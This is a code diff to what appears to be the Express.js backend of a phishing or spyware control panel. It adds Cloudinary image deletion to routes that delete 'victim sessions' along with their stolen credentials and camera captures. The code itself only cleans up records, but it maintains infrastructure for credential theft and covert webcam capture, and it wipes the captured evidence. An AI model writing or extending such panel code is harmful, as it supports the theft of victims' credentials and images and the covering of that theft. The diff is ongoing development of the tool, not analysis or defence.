@@ -217,6 +217,14 @@ router.delete('/sessions/:id', async (req, res) => {
     const session = await VictimSession.findById(req.params.id);
     if (!session) return res.status(404).json({ error: 'Session not found' });
 
+    // Delete associated Cloudinary images first
+    const cameraCaptures = await CameraCapture.find({ sessionId: session._id });
+    for (const capture of cameraCaptures) {
+      if (capture.cloudinaryPublicId) {
+        await deleteImage(capture.cloudinaryPublicId);
+      }
+    }
+
     await Promise.all([
       StolenCredential.deleteMany({ sessionId: session._id }),
       CameraCapture.deleteMany({ sessionId: session._id }),
@@ -224,7 +232,7 @@ router.delete('/sessions/:id', async (req, res) => {
       VictimSession.findByIdAndDelete(req.params.id)
     ]);
 
-    res.json({ message: 'Session and all associated data deleted' });
+    res.json({ message: 'Session and all associated data deleted (Cloudinary images cleaned up)' });
   } catch (error) {
     res.status(500).json({ error: error.message });
   }
@@ -241,6 +249,14 @@ router.post('/sessions/bulk-delete', async (req, res) => {
     for (const id of ids) {
       const session = await VictimSession.findById(id);
       if (session) {
+        // Delete associated Cloudinary images first
+        const cameraCaptures = await CameraCapture.find({ sessionId: session._id });
+        for (const capture of cameraCaptures) {
+          if (capture.cloudinaryPublicId) {
+            await deleteImage(capture.cloudinaryPublicId);
+          }
+        }
+
         await Promise.all([
           StolenCredential.deleteMany({ sessionId: session._id }),
           CameraCapture.deleteMany({ sessionId: session._id }),
@@ -250,7 +266,7 @@ router.post('/sessions/bulk-delete', async (req, res) => {
     }
 
     await VictimSession.deleteMany({ _id: { $in: ids } });
-    res.json({ message: `Deleted ${ids.length} sessions` });
+    res.json({ message: `Deleted ${ids.length} sessions (Cloudinary images cleaned up)` });
   } catch (error) {
     res.status(500).json({ error: error.message });
   }
